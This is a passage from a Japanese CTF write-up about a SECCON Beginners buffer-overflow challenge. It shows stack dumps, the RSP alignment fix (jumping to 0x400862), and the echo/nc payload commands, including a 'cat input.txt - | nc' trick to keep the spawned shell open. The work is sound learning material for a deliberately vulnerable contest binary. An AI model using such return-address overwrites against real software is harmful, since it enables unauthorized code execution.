+0x00007ffc3170a3e0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; buf
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a3e8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a3f0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a3f8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a400 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a408 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400861 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a410 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x000000000000000a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a418 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f768851a0b3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a420 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f768871c620 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a428 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007ffc3170a508 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+
+Oops!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; RSP is misaligned!
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Some&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; functions such as `&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;` use `&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;movaps&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;` instructions in libc-2.27 and later.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;This&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; instruction fails when RSP is not a multiple of 0x10.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Find&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; a way to align RSP! You&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;re almost there!
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;　スタックオーバーフローが発生し、リターンアドレスが書き換えられているのがわかりました。しかし、フラグが獲得できなく、奇妙なメッセージが表示されました。libc-2.27 以降では RSP が 0x10 の倍数でないといけないからなんとかして整頓しろとのことです。意味がわからなくて永遠に調べてたんですがさっぱりわかりませんでした。どなたか詳しく解説していただけると幸いです。&lt;br &#x2F;&gt;
+　やけくそになって色々してたら、まさかの Conglaturation! がでました。&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#bf616a;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; echo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x62\x08\x40\x00\x00\x00\x00\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39; | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; bs.quals.beginners.seccon.jp 9001
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Your&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; goal is to call `&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;win&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;` function (located at 0x400861)
+
+   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]           [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Stack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719b0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f15575b5fc8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; buf
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719b8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400ad0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719c0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400ad0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719c8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f15575f0190 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719d0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007fffad3719e0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719d8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x000000000040084e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719e0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000000000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719e8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f15573ec0b3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719f0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f15575ee620 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719f8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007fffad371ad8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+
+Input:
+   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]           [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Stack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719b0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; buf
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719b8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719c0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719c8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719d0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719d8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400862 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719e0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x000000000000000a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719e8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f15573ec0b3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719f0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f15575ee620 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fffad3719f8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007fffad371ad8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+
+Congratulations!
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;　え・・・・？リターンアドレスを&lt;code&gt;0x400861&lt;&#x2F;code&gt;から&lt;code&gt;0x400862&lt;&#x2F;code&gt;に変えただけですよ・・・？よくわからないけどこれでフラグゲットやったーと思いながら、問題サーバーに接続して攻撃してみたらやっぱり Conglaturations! と出てくれました。あれ、もしかして私天才・・・？なんて思ってフラグが出てくるのを今か今かと待っていましたがでてきません。怒涛の&lt;code&gt;ls&lt;&#x2F;code&gt;連打をしても何も起きません。  解法が違うのかと思って調べたりして頑張っていましたが、3時間やっても何も進捗がないので泣きながら寝てしまいました。&lt;br &#x2F;&gt;
+　CTF 終了後に Twitter にて解決策をさかいたにしんじろうさん(&lt;code&gt;@shin2ro_o&lt;&#x2F;code&gt;)に教えて頂いたのですが、どうやらパイプで標準有力を渡すのがだめだったみたいです。一度文字列をファイルに書き込んでから、それを&lt;code&gt;cat&lt;&#x2F;code&gt;した結果を&lt;code&gt;nc&lt;&#x2F;code&gt;に渡してあげると、Congulatirations! の後に&lt;code&gt;ls&lt;&#x2F;code&gt;、&lt;code&gt;cat&lt;&#x2F;code&gt;で無事 flag を見つける事ができました。&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#bf616a;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; echo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x62\x08\x40\x00\x00\x00\x00\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39; &amp;gt; input.txt
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; cat input.txt - | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; bs.quals.beginners.seccon.jp 9001
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Your&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; goal is to call `&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;win&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;` function (located at 0x400861)
+
+   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]           [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Stack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61600 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007faa73b589a0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; buf
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61608 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000000000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61610 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000000000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61618 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007faa73d71170 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61620 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007ffcd3c61630 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61628 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x000000000040084e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61630 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400ad0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61638 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007faa73778b97 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61640 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000000001 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61648 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007ffcd3c61718 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+
+Input:
+   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]           [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Stack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61600 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; buf
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffcd3c61608 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x4141414141414141 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
